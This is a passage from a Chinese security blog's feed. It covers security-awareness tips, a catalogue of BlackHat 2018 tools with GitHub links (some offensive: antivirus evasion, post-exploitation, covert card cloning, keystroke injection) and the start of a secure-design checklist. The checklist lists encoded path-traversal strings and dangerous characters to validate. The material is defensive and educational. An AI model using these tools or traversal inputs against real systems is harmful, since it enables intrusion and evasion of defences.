工作移动存储介质和私人的移动存储介质交叉使用</td><td>1.对于安全要求较高的设备，应该仅允许使用特定的移动存储介质<br>2.敏感信息如果要存储在移动介质上，请加密后再存储，并妥善保管该介质。</td></tr><tr><td>购物安全</td><td>1.建议在大型的网购平台进行网购，不要轻易相信各种打着打折，优惠的旗号</td><td>1.在登录购物网站时要核实网站的域名是否正确。谨慎点击商家从即时通讯工具上发送的支付链接</td></tr><tr><td>隐私安全</td><td>1.要在身份证复印件上加添加用途备注<br>2.不要随意在各种网站上留个人信息<br>3.在留取个人信息前仔细阅读网站的隐私保护声明<br>4.不要总把私人账号随意借给别人使用<br>5.平时不要习惯乱用他人的电脑登陆<br>6.登录账号输入密码的时候注意周围是否有人盯着你的输入<br>7.重要的账号在公共场所登陆后要注意退出<br>8.妥善处置快递单、车票、购物小票等包含个人信息的单据<br>9.不在微博、群聊中透露个人信息<br>10.慎重参加网上调查活动</td><td>1.安全意识、使用习惯是首要</td></tr><tr><td>预防诈骗</td><td>1.不要轻易相信别人，尤其是在网络中<br>2.不要随意点击别人发过来的网页链接，尤其是在邮件和即时通讯软件中<br>3.能够自己输入的网址尽量自己输入，而不要直接点击发过来的链接<br>4.邮件中涉及到修改密码的链接不要轻易点击<br>5.在网络上涉及银行卡有关的操作一定要慎重，要仔细查看相关网站的信息（证书、域名等）<br>6.管理员一般不会询问用户的密码，不管在何种场合下（邮件、论坛等）</td><td>1.安全意识、使用习惯是首要</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      《安全意识Top 10》基于项目组收集、整理和筛选的近200个典型信息安全事件。这些信息安全事件全部发生在2017年1月至5月和2018年1月至5月两个时间段内。这10类安全意识项是根据对200个安全事件的数据统计分析，并结合了对普遍性、危害性、可控性的一致性评估而形成。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
      <category term="培训" scheme="https://www.diyz.bid/tags/%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>2018BlackHat工具</title>
    <link href="https://www.diyz.bid/Tools/2018BlackHat%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.diyz.bid/Tools/2018BlackHat工具/</id>
    <published>2018-08-27T02:59:11.000Z</published>
    <updated>2018-10-11T10:12:52.867Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-Android，iOS和移动黑客"><a href="#1-Android，iOS和移动黑客" class="headerlink" title="1.Android，iOS和移动黑客"></a>1.Android，iOS和移动黑客</h3><ul><li>Vulnerable iOS app: Swift version<br>易受攻击的IOS应用程序（DVIA）旨在为学生、移动安全爱好者和专业人士等提供的一个练习他们的IOS渗透测试技能的平台。目前该程序拥有以下漏洞：<ul><li>1.本地数据存储</li><li>2.越狱检测</li><li>3.过度授权</li><li>4.运行操作</li><li>5.防钩子/调试</li><li>6.二进制防护</li><li>7.指纹/面部识别绕过</li><li>7.钓鱼</li><li>9.旁路数据泄露</li><li>10.IPC问题</li><li>11.加密破环</li><li>12.Webview问题</li><li>13.网络层安全</li><li>14.应用程序修补</li><li>15.内存中敏感信息</li></ul></li></ul><p>　　<a href="https://github.com/prateek147/DVIA-v2" target="_blank" rel="noopener">https://github.com/prateek147/DVIA-v2</a></p><h3 id="2-代码评估"><a href="#2-代码评估" class="headerlink" title="2.代码评估"></a>2.代码评估</h3><ul><li>OWASP dependency check<br>Dependency-Check是一种软件组合分析（SCA）工具，它试图检测项目依赖项中包含的公开披露的漏洞。它通过确定给定依赖项是否存在公共平台枚举（CPE）标识符来完成此操作。如果找到，它将生成链接到相关CVE条目的报告。</li></ul><p>　　<a href="https://github.com/jeremylong/DependencyCheck" target="_blank" rel="noopener">https://github.com/jeremylong/DependencyCheck</a></p><ul><li>Cougar scan<br>Puma Scan是一款.NET软件安全代码分析工具，可在开发团队编写代码时提供实时，持续的源代码分析。在Visual Studio中，漏洞会立即显示在开发环境中作为拼写检查和编译器警告，从而防止安全漏洞进入您的应用程序。Puma Scan还集成到构建中，以便在编译时提供安全性分析。</li></ul><p>　　<a href="https://github.com/pumasecurity/puma-scan" target="_blank" rel="noopener">https://github.com/pumasecurity/puma-scan</a></p><h3 id="3-加密"><a href="#3-加密" class="headerlink" title="3.加密"></a>3.加密</h3><ul><li>DeepViolet: SSL / TLS scanning API and tools<br>DeepViolet是一个用Java编写的TLS / SSL扫描API。该工具支持命令行和图形界面两种使用方式，这两种方式都可用于扫描HTTPS Web服务器以检查服务器证书信任链，撤销状态，检查挂起到期的证书，弱签名算法等等。</li></ul><p>　　<a href="https://github.com/spoofzu/DeepViolet" target="_blank" rel="noopener">https://github.com/spoofzu/DeepViolet</a></p><h3 id="4-数据取证和事件响应"><a href="#4-数据取证和事件响应" class="headerlink" title="4. 数据取证和事件响应"></a>4. 数据取证和事件响应</h3><ul><li>Beginner to expert<br>Bro是一种被动的开源网络流量分析器。它主要是一个安全监视器，可以检查链路上的所有流量，以查看可疑活动的迹象。然而，更一般地，Bro支持甚至在安全域之外的各种流量分析任务，包括性能测量和帮助解决问题。</li></ul><p>　　<a href="https://github.com/bro/bro" target="_blank" rel="noopener">https://github.com/bro/bro</a></p><ul><li>CyBot: Open Source Threat Intelligence Chatbot<br>CyBot是一款开源的威胁情报聊天机器人。用户可以向CyBot提出简单的问题，甚至与其他人员分享结果，而不是去各种网站或仪表板进行研究，这种能力现在是免费的，并且正在积极开发中。</li></ul><p>　　<a href="https://github.com/CylanceSPEAR/CyBot" target="_blank" rel="noopener">https://github.com/CylanceSPEAR/CyBot</a></p><ul><li>LogonTracer<br>LogonTracer是一款用于分析Window活动目录事件日志来调查恶意登录的分析工具。LogonTracer将登录相关事件中的主机名（或IP地址）和帐户名关联起来，并将其显示为图形。这样，就可以看到登录尝试发生在哪个帐户以及使用了哪个主机。</li></ul><p>　　<a href="https://github.com/JPCERTCC/LogonTracer" target="_blank" rel="noopener">https://github.com/JPCERTCC/LogonTracer</a></p><ul><li>Rastrea2r (reload!): Collect and hunt IOC with Gusto and Style<br>rastrea2r是一个多平台开源工具，允许事件响应者和SOC分析师对可疑系统进行分类，并在几分钟内搜索数千个端点上的妥协指标（IOC）。如果要从远程系统（包括内存转储）解析和收集感兴趣的工件，rastrea2r可以跨多个端点执行sysinternal、系统命令和其他第三方工具（包括自定义脚本），将输出结果集中保存方便进行自动或手动分析。通过使用客户端/服务器RESTful API，rastrea2r还可以使用YARA规则在多个系统上搜索磁盘和内存上的IOC。</li></ul><p>　　<a href="https://github.com/rastrea2r/rastrea2r" target="_blank" rel="noopener">https://github.com/rastrea2r/rastrea2r</a></p><ul><li>RedHunt OS (VM): Virtual machine for adversary emulation and threat search<br>RedHunt旨在通过集成攻击者的武器库以及防御者的工具包来积极识别您环境中的威胁，从而成为一站式商店，满足您的所有威胁模拟和威胁搜索需求。</li></ul><p>　　<a href="https://github.com/redhuntlabs/RedHunt-OS" target="_blank" rel="noopener">https://github.com/redhuntlabs/RedHunt-OS</a></p><h3 id="5-反制工具"><a href="#5-反制工具" class="headerlink" title="5.反制工具"></a>5.反制工具</h3><ul><li>AVET: AntiVirus Evasion Tool<br>AVET是一种AntiVirus Evasion工具，旨在使测试人员的更加轻松的结构病毒文件，更有针对性的设计防病毒方案。</li></ul><p>　　<a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></p><ul><li>DSP: Docker Security Playground<br>Docker Security Playground主要功能有以下几点：<ul><li>1.创建网络和网络安全方案，便于了解所有网络协议、规则和安全问题</li><li>2.学习渗透测试技术</li><li>3.更加灵活地管理docker-compose项目</li></ul></li></ul><p>　　<a href="https://github.com/giper45/DockerSecurityPlayground" target="_blank" rel="noopener">https://github.com/giper45/DockerSecurityPlayground</a></p><ul><li>hideNsneak: Attack Confusion Framework<br>hideNsneak通过提供快速部署，管理和删除各种云服务的界面，帮助管理渗透测试人员的攻击基础架构。包括虚拟机，域前端，Cobalt Strike服务器，API网关和防火墙。</li></ul><p>　　<a href="https://github.com/rmikehodges/hideNsneak" target="_blank" rel="noopener">https://github.com/rmikehodges/hideNsneak</a></p><ul><li>Merlin<br>Merlin是一种后期利用工具，可以轻松交叉编译以便在任何平台上运行命令，实现对主机的控制。</li></ul><p>　　<a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></p><ul><li>RouterSploit<br>RouterSploit Framework是一个专用于嵌入式设备的开源开发框架。它拥有以下渗透测试模块：<ul><li>1.exploits - 利用已识别漏洞的模块</li><li>2.creds - 用于测试网络服务凭证的模块</li><li>3.scanners - 检查目标是否容易受到攻击的模块</li><li>4.payloads - 负责为各种体系结构和注入点生成有效载荷的模块</li><li>5.generic - 执行通用攻击的模块</li></ul></li></ul><p>　　<a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a></p><h3 id="6-硬件-嵌入式"><a href="#6-硬件-嵌入式" class="headerlink" title="6.硬件/嵌入式"></a>6.硬件/嵌入式</h3><ul><li>ChipWhisperer<br>ChipWhisperer是一个致力于硬件安全研究的开源工具链。该工具链由几层开源组件组成：<ul><li>1.硬件：ChipWhisperer使用一个捕获板和一个目标板。ChipWhisperer-Lite捕获板和许多目标板的原理图和PCB布局是免费提供的。</li><li>2.固件：ChipWhisperer硬件上使用三个独立的固件。捕获板具有USB控制器（在C中）、用于高速捕获的FPGA（在Verilog中）和开源固件。此外，目标设备有自己的固件; 此存储库包含许多针对不同目标的固件示例。</li><li>3.软件：ChipWhisperer软件由用于控制硬件的捕获程序和用于处理捕获数据的分析器程序组成。</li></ul></li></ul><p>　　<a href="https://github.com/newaetech/chipwhisperer" target="_blank" rel="noopener">https://github.com/newaetech/chipwhisperer</a></p><ul><li>JTAGulator: Uncover the Achilles heel of hardware security<br>JTAGulator是一款可帮助识别目标设备上测试点，过孔或元件焊盘的OCD连接的开源硬件工具。</li></ul><p>　　<a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a></p><ul><li>Micro-Renovator: Bring the processor firmware into the code<br>MicroRenovator提供了一种部署处理器微码的机制，该机制独立于制造商和操作系统提供的更新，通过添加自定义EFI启动脚本，该脚本在操作系统运行之前加载微码。这使操作系统内核能够检测更新的微码并启用，从而修复幽灵漏洞。</li></ul><p>　　<a href="https://github.com/syncsrc/MicroRenovator" target="_blank" rel="noopener">https://github.com/syncsrc/MicroRenovator</a></p><ul><li>TumbleRF: RF Blur becomes easy<br>TumbleRF是一个模糊测试框架，用于构建面向RF模糊测试的应用。TumbleRF旨在通过提供API以跨协议，无线电和驱动程序统一这些技术来实现RF模糊测试。</li></ul><p>　　<a href="https://github.com/riverloopsec/tumblerf" target="_blank" rel="noopener">https://github.com/riverloopsec/tumblerf</a></p><ul><li>Walrus: Make the most of your card cloning device<br>Walrus是一款适用于非接触式卡片克隆设备的Android应用程序，如Proxmark3和Chameleon Mini。使用Google Pay风格的简单界面，可以将访问控制卡读入钱包，以便稍后编写或模拟。<br>Walrus专为红队参与期间的物理安全评估人员而设计，支持基本任务，如读卡，写入和仿真，以及特定于设备的功能，如天线调谐和设备配置。诸如位置标记之类的更高级功能使得处理多个目标变得容易，而批量读取允许在接近目标时秘密地捕获多个卡。</li></ul><p>　　<a href="https://github.com/TeamWalrus/Walrus" target="_blank" rel="noopener">https://github.com/TeamWalrus/Walrus</a></p><h3 id="7-物联网"><a href="#7-物联网" class="headerlink" title="7.物联网"></a>7.物联网</h3><ul><li>Scalable Dynamic Analysis Framework for IoT Devices<br>DECAF是一个基于QEMU的二进制分析平台。这也是DroidScope动态Android恶意软件分析平台的基础。支持：即时虚拟机内部审计、精确无损的内核污染、事件驱动的编程接口、动态设备管理等功能。</li></ul><p>　　<a href="https://github.com/sycurelab/DECAF" target="_blank" rel="noopener">https://github.com/sycurelab/DECAF</a></p><ul><li>BLE CTF project<br>BLE CTF可以帮助用户学习蓝牙低功耗客户端和服务器交互的核心概念，从而学习如何通过蓝牙入侵。</li></ul><p>　　<a href="https://github.com/hackgnar/ble_ctf" target="_blank" rel="noopener">https://github.com/hackgnar/ble_ctf</a></p><ul><li>WHID Syringe and WHID Elite: Next Generation HID Aggressive Device<br>WHID注入器允许通过Wi-Fi将键入信息发送到目标机器。目标将Ducky识别为标准HID键盘和串行端口，从而允许远程执行目标上的交互式命令和脚本。</li></ul><p>　　<a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></p><h3 id="8-恶意软件防御"><a href="#8-恶意软件防御" class="headerlink" title="8.恶意软件防御"></a>8.恶意软件防御</h3><ul><li>Provides advanced deep learning analysis platform for every security researcher<br>这是一个用于演示安全研究机器学习即服务（MLaaS）的Web平台。它有一个机器学习（ML）管道来构建和调整模型。它还有一个演示对抗性ML和对策的门户。</li></ul><p>　　<a href="https://github.com/intel/Resilient-ML-Research-Platform" target="_blank" rel="noopener">https://github.com/intel/Resilient-ML-Research-Platform</a></p><ul><li>EKTotal<br>EKTotal是一个可以自动分析Drive-by Download攻击的流量的集成分析工具。它可以识别四种类型的漏洞利用工具包，如RIG和Magnitude，以及十多种类型的攻击方式，如Seamless和Fobos。EKTotal还可以提取漏洞利用代码和恶意软件。</li></ul><p>　　<a href="https://github.com/nao-sec/ektotal" target="_blank" rel="noopener">https://github.com/nao-sec/ektotal</a></p><ul><li>Firmware Audit: Platform Firmware Security Automation for Blue Teams and DFIR<br>固件审核（fwaudit）是一个平台固件测试实用程序。它运行测试并收集有关系统固件，日期和哈希输出的诊断和安全信息，以用于取证和事件响应。</li></ul><p>　　<a href="https://github.com/PreOS-Security/fwaudit" target="_blank" rel="noopener">https://github.com/PreOS-Security/fwaudit</a></p><ul><li>MaliceIO<br>VirusTotal的免费开源版本</li></ul><p>　　<a href="https://github.com/maliceio/malice" target="_blank" rel="noopener">https://github.com/maliceio/malice</a></p><ul><li>Goal — see MacOS Security Tools<br>Objective-See旨在提供永久免费并且简单而有效的OS X安全工具。</li></ul><p>　　<a href="https://github.com/objective-see" target="_blank" rel="noopener">https://github.com/objective-see</a></p><h3 id="9-恶意软件进攻"><a href="#9-恶意软件进攻" class="headerlink" title="9.恶意软件进攻"></a>9.恶意软件进攻</h3><ul><li>BloodHound 1.5<br>BloodHound是一个单页的Javascript Web应用程序，构建在Linkurious之上，使用Electron编译，其中一个Neo4j数据库由PowerShell摄取器提供。<br>BloodHound使用图论来揭示Active Directory环境中隐藏的且通常是非预期的关系。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径。防御者可以使用BloodHound来识别和消除那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。</li></ul><p>　　<a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><h3 id="10-网络攻击"><a href="#10-网络攻击" class="headerlink" title="10.网络攻击"></a>10.网络攻击</h3><ul><li>armory<br>Armory是一种用于从许多工具中获取大量外部和发现数据，将其添加到数据库并关联所有相关信息的工具。它旨在从各种工具中获取信息用于其他工具。</li></ul><p>　　<a href="https://github.com/depthsecurity/armory" target="_blank" rel="noopener">https://github.com/depthsecurity/armory</a></p><ul><li>Chiron: An advanced IPv6 security assessment and penetration testing framework<br>Chiron是一个IPv6安全评估框架，用Python编写并使用Scapy。它由以下模块组成：<ul><li>1.IPv6扫描程序</li><li>2.IPv6本地链接</li><li>3.IPv4到IPv6代理</li><li>4.IPv6攻击模块</li><li>5.IPv6代理</li></ul></li></ul><p>　　<a href="https://github.com/aatlasis/Chiron" target="_blank" rel="noopener">https://github.com/aatlasis/Chiron</a></p><ul><li>DELTA: SDN Security Assessment Framework<br>DELTA是一种渗透测试框架，可为不同的测试用例重新生成已知的攻击方案。该框架还提供了通过使用模糊测试技术在SDN中发现未知安全问题的能力。</li></ul><p>　　<a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a></p><ul><li>Mallet: Intercepting agent for any protocol<br>Mallet是一种更为通用的用于为任意协议创建代理的工具。</li></ul><p>　　<a href="https://github.com/sensepost/mallet" target="_blank" rel="noopener">https://github.com/sensepost/mallet</a></p><ul><li>PowerUpSQL: PowerShell Toolkit for attacking SQL Server in an enterprise<br>PowerUpSQL包括支持SQL Server发现，弱配置审计，规模特权升级以及OS命令执行等后期利用操作的功能。它旨在用于内部渗透测试和红队测试，此外管理员还可以用它快速清点其ADS域中的SQL Server，并执行与SQL Server相关的常见威胁搜索任务。</li></ul><p>　　<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><ul><li>WarBerryPi<br>WarBerryPi在红队中被用作硬件植入设备。只需找到一个网络端口并将其接入，便可以在短时间内尽可能多地获取信息。</li></ul><p>　　<a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><h3 id="11-网络防御"><a href="#11-网络防御" class="headerlink" title="11.网络防御"></a>11.网络防御</h3><ul><li>ANWI (New Wireless IDS): $5 WIDS<br>ANWI是一种新型无线入侵检测系统，它基于低成本的Wi-Fi模块（ESP8266），可以部署在覆盖区域的物理周边。它使那些无法负担昂贵的WIDS解决方案的组织能够以很低的成本保护他们的网络。</li></ul><p>　　<a href="https://github.com/SanketKarpe/anwi" target="_blank" rel="noopener">https://github.com/SanketKarpe/anwi</a></p><ul><li>CHIRON: Home-based network analysis and machine learning threat detection framework<br>CHIRON是基于ELK堆栈和机器学习威胁检测框架AKTAION的网络安全分析工具。CHIRON解析并显示来自P0f，Nmap和BRO IDS的数据。CHIRON专为家庭环境而设计，可让您更好地了解家庭互联网设备（物联网，电脑，手机，平板电脑等）存在的风险。</li></ul><p>　　<a href="https://github.com/jzadeh/chiron-elk" target="_blank" rel="noopener">https://github.com/jzadeh/chiron-elk</a></p><ul><li>Cloud Security Suite: One-stop tool for AWS / GCP / Azure security auditing at<br>CS Suite是用于审核AWS基础架构的安全状态的一站式工具。CS Suite利用当前的开源工具功能，并将其他缺失的检查添加到一个工具中更加便于管理。</li></ul><p>　　<a href="https://github.com/SecurityFTW/cs-suite" target="_blank" rel="noopener">https://github.com/SecurityFTW/cs-suite</a></p><ul><li>DejaVu: An open source spoofing framework<br>DejaVu是一个开源欺骗框架。防御者可以使用它在不同VLAN的网络上战略性地部署多个交互式诱饵（HTTP服务器，SQL，SMB，FTP，SSH，客户端 - NBNS）。为了简化诱饵的管理，框架还提供了web管理界面，可用于从集中控制台有效地部署，管理和配置所有诱饵。记录和警报仪表板显示有关生成的警报的详细信息，并可进一步配置如何处理这些警报。</li></ul><p>　　<a href="https://github.com/bhdresh/Dejavu" target="_blank" rel="noopener">https://github.com/bhdresh/Dejavu</a></p><h3 id="12-OSINT-–-开源智能"><a href="#12-OSINT-–-开源智能" class="headerlink" title="12.OSINT – 开源智能"></a>12.OSINT – 开源智能</h3><ul><li>DataSploit 2.0<br>DataSploit是一款用于处理公开来源情报（OSINT）的辅助工具，具有以下功能：<ul><li>1.对域名/电子邮件/用户名/IP进行检索，并从不同来源查找相关信息。</li><li>2.关联并处理结果，以统一的方式展示它们。</li><li>3.试图找出与目标相关的凭证，api-key，令牌，子域，域名历史，旧门户等。</li><li>4.对特定数据使用特定脚本自动收集OSINT。</li><li>5.对收集的数据进行有效性验证。</li><li>6.生成HTML、JSON或txt格式的报告。</li></ul></li></ul><p>　　<a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></p><ul><li>Dradis framework: Learn how to reduce reporting time by half<br>Dradis是一个专为InfoSec团队量身定制的开源协作框架，。</li></ul><p>　　<a href="https://github.com/dradis/dradis-ce" target="_blank" rel="noopener">https://github.com/dradis/dradis-ce</a></p><h3 id="13-逆向工程"><a href="#13-逆向工程" class="headerlink" title="13.逆向工程"></a>13.逆向工程</h3><ul><li>Snake: Malware Storage Zoo<br>Snake是一个恶意软件存储容器。Snake旨在提供足够的信息，使分析师能够快速有效地选择最适合手头任务的工具。此外它还提供了从静态分析到与外部服务交互的各种功能。</li></ul><p>　　<a href="https://github.com/countercept/snake" target="_blank" rel="noopener">https://github.com/countercept/snake</a></p><h3 id="14-智能电网-工业安全"><a href="#14-智能电网-工业安全" class="headerlink" title="14.智能电网/工业安全"></a>14.智能电网/工业安全</h3><ul><li>GRFICS: Graphic Realism Framework for Industrial Control Simulation<br>GRFICS是用于工业控制模拟的图形框架，它使用Unity 3D游戏引擎图形来降低工业控制系统安全性的进入门槛。GRFICS为用户提供完整的虚拟工业控制系统（ICS）网络，支持常见攻击，包括命令注入，中间人和缓冲区溢出，并通过对3D可视化更加直观地展示攻击的影响。此外用户还可以通过使用强大的防火墙规则正确隔离网络或编写入侵检测规则来练习其防御技能。</li></ul><p>　　<a href="https://github.com/djformby/GRFICS" target="_blank" rel="noopener">https://github.com/djformby/GRFICS</a></p><h3 id="15-漏洞评估"><a href="#15-漏洞评估" class="headerlink" title="15.漏洞评估"></a>15.漏洞评估</h3><ul><li>Robustness Toolbox for Machine Learning Models<br>adversarial-robustness-toolbox一个致力于对抗性机器学习的工具箱。旨在帮助研究人员快速构建用于分析的攻击和防御方法的机器学习模型。它还提供了许多最新的攻击和防御类型。</li></ul><p>　　<a href="https://github.com/IBM/adversarial-robustness-toolbox" target="_blank" rel="noopener">https://github.com/IBM/adversarial-robustness-toolbox</a></p><ul><li>Android Dynamic Analysis Tool (ADA)<br>这是一款基于安卓的动态分析工具</li></ul><p>　　<a href="https://github.com/ANELKAOS/ada" target="_blank" rel="noopener">https://github.com/ANELKAOS/ada</a></p><ul><li>Archery: Open Source Vulnerability Assessment and Management<br>Archery是一个开源漏洞评估和管理工具，可帮助开发人员和测量人员执行扫描和管理漏洞。Archery使用流行的开源工具对Web应用程序和网络执行全面扫描。它还执行Web应用程序动态验证扫描，并使用selenium覆盖整个应用程序。开发人员还可以利用该工具实现其DevOps CI / CD环境。</li></ul><p>　　<a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">https://github.com/archerysec/archerysec</a></p><ul><li>Boofuzz<br>Boofuzz是古老的Sulley模糊框架的一个分支和继承者。它修复了许多错误并且提升了可扩展性。</li></ul><p>　　<a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><ul><li>BTA<br>BTA是一个开源的Active Directory安全审计框架。能够帮助审计人员获取以下信息：<ul><li>1.目标对象（计算机、用户帐户等）的权限</li><li>2.访问邮箱的权限</li><li>3.域管理员权限的帐户信息</li><li>4.扩展权限信息等</li><li>5.两个时间点之间AD发生的变化</li></ul></li></ul><p>　　<a href="https://github.com/airbus-seclab/bta" target="_blank" rel="noopener">https://github.com/airbus-seclab/bta</a></p><ul><li>Take advantage of<br>DeepExploit是与Metasploit链接的全自动渗透测试工具。DeepExploit标识目标服务器上所有已打开端口的状态，并使用机器学习以精确的方式进行漏洞攻击。它的主要特性有这几点：高效的漏洞利用、深入渗透、自学习和训练时间短。</li></ul><p>　　<a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit" target="_blank" rel="noopener">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p><ul><li>Halcyon IDE: for Nmap script developers<br>Halcyon IDE可以快速轻松地开发Nmap脚本，以便在应用程序和基础架构上执行高级扫描。它是第一个专门为Nmap脚本开发发布的IDE。</li></ul><p>　　<a href="https://github.com/s4n7h0/Halcyon" target="_blank" rel="noopener">https://github.com/s4n7h0/Halcyon</a></p><ul><li>SimpleRisk<br>SimpleRisk是一款开源工具，它可以帮助安全专家们管控存在风险的管理行为。SimpleRisk向用户呈现了一个风险管理控制面板，上面显示了系统，团队和安全技术的状态以及正在进行中的风险化解项目。</li></ul><p>　　<a href="https://github.com/simplerisk" target="_blank" rel="noopener">https://github.com/simplerisk</a></p><ul><li>TROMMEL<br>TROMMEL可用于筛选嵌入式设备文件，以识别潜在的易受攻击的指标。</li></ul><p>　　<a href="https://github.com/CERTCC/trommel" target="_blank" rel="noopener">https://github.com/CERTCC/trommel</a></p><h3 id="16-Web-AppSec"><a href="#16-Web-AppSec" class="headerlink" title="16.Web AppSec"></a>16.Web AppSec</h3><ul><li>Take a look at NGINX’s ModSec 3.0: Software Web Application Firewall<br>ModSecurity是一个Web应用程序防火墙引擎，支持用户自定义配置和规则。</li></ul><p>　　<a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><ul><li>Astra: Automatic security testing of the REST API<br>Astra可以让安全工程师或开发人员用到开发流程中，他们可以在开发周期的早期检测和修补漏洞。Astra可以自动检测和测试登录和注销（Authentication API），因此任何人都可以轻松地将其集成到CICD通道中。</li></ul><p>　　<a href="https://github.com/flipkart-incubator/Astra" target="_blank" rel="noopener">https://github.com/flipkart-incubator/Astra</a></p><ul><li>Burp Replicator: Replication of automated complex vulnerabilities<br>Replicator是一个Burp扩展，可帮助开发人员重现渗透测试问题。渗透测试器生成一个包含报告结论的Replicator文件。测试人员将Replicator文件发送到客户端，就可以在Burp中打开该文件并复现问题。</li></ul><p>　　<a href="https://github.com/PortSwigger/replicator" target="_blank" rel="noopener">https://github.com/PortSwigger/replicator</a></p><ul><li>OWASP offensive web testing framework<br>WASP OWTF是一个专注于渗透和安全测试、OWASP测试（v3和v4）、OWASP Top 10、PTES和NIST等安全标准的Web测试框架。该工具高度可配置，任何人都可以在配置文件中轻松创建简单的插件或添加新测试，无需任何开发经验。</li></ul><p>　　<a href="https://github.com/owtf/owtf" target="_blank" rel="noopener">https://github.com/owtf/owtf</a></p><ul><li>OWASP JoomScan project<br>OWASP Joomla是一个开源漏洞扫描程序，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷。此外，OWASP JoomScan提供了用户友好的界面，并以文本和HTML格式输出报告。</li></ul><p>　　<a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a></p><ul><li>WSSAT<br>SSAT是一个开源Web服务安全扫描工具，它通过编辑配置文件提供动态环境来添加，更新或删除漏洞。此工具接受WSDL地址列表作为输入文件，针对每个服务进行安全漏洞静态和动态测试。</li></ul><p>　　<a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></p>]]></content>
    
    <summary type="html">
    
      本文整理并介绍了BlackHat2018会上分享的一系列黑客工具，如果有需要补充或者有问题欢迎联系。
    
    </summary>
    
      <category term="Tools" scheme="https://www.diyz.bid/categories/Tools/"/>
    
    
      <category term="工具" scheme="https://www.diyz.bid/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>安全设计Checklist</title>
    <link href="https://www.diyz.bid/Security/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist/"/>
    <id>https://www.diyz.bid/Security/安全设计Checklist/</id>
    <published>2018-08-23T09:29:08.000Z</published>
    <updated>2018-10-11T10:12:52.892Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、输入验证"><a href="#一、输入验证" class="headerlink" title="一、输入验证"></a>一、输入验证</h2><ul><li><p>校验跨信任边界传递的不可信数据(策略检查数据合法性，含白名单机制等)格式化字符串时，依然要检验用户输入的合法性，避免可造成系统信息泄露或者拒绝服务</p></li><li><p>禁止向Java Runtime.exec()方法传递不可信、未净化的数据(当参数中包含空格，双引号，以-或者/符号开头表示一个参数开关时，可能会导致参数注入漏洞)，建议如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。</p></li><li><p>验证路径之前应该先将其标准化为实际路径（特殊的文件名，比如“..”，symbolic links、hard links、shortcuts）</p></li><li><p>从ZipInputStream提取文件，如果不在程序预期计划的目录之内时，应拒绝将其提取出来，或者将其提取到一个安全的位置</p></li><li><p>从ZipInputStream提取文件，若解压之后的文件大小超过一定的限制时，必须拒绝将其解压</p></li><li><p>在处理以前，验证所有来自客户端的数据，包括：所有参数、URL、HTTP头信息（比如：cookie名字和数据值），确定包括了来自 JavaScript、Flash 或其他嵌入代码的post 返回信息</p></li><li><p>如果任何潜在的危险字符必须被作为输入，请确保您执行了额外的安全控制，比如：输入转义、输出编码、特定的安全 API等。部分常见的危险字符，包含但不限于： &lt; &gt; “ ‘ % ( ) &amp; + \ \’ \”  </p></li><li><p>如果您使用的标准验证规则无法验证下面的输入，那么它们需要被单独验证，比如验证空字节 (%00)； 验证换行符 (%0d, %0a, \r, \n)； 验证路径替代字符“点-点-斜杠”（../或 ..\）；如果支持 UTF-8 扩展字符集编码，验证替代字符： %c0%ae%c0%ae/ (使用规范化验证双编码或其他类型的编码)</p></li><li><p>严格验证来自重定向输入的数据（一个攻击者可能向重定向的目标直接提交恶意代码，从而避开应用程序逻辑以及在重定向前执行的任何验证）</p></li><li><p>验证数据类型</p></li><li><p>验证数据范围</p></li><li><p>验证数据长度</p></li></ul><hr><h2 id="二、输出编码"><a href="#二、输出编码" class="headerlink" title="二、输出编码"></a>二、输出编码</h2><ul><li><p>为每一种输出编码方法采用一个标准的、已通过测试的规则</p></li><li><p>通过语义输出编码方式，对所有从服务端返回到客户端的数据进行编码。比如HTML编码、URL编码等，编码形式需根据具体的应用场景选择 </p></li><li><p>除非对目标编译器是安全的，否则请对所有字符进行编码 </p></li><li><p>针对 SQL、XML 和 LDAP 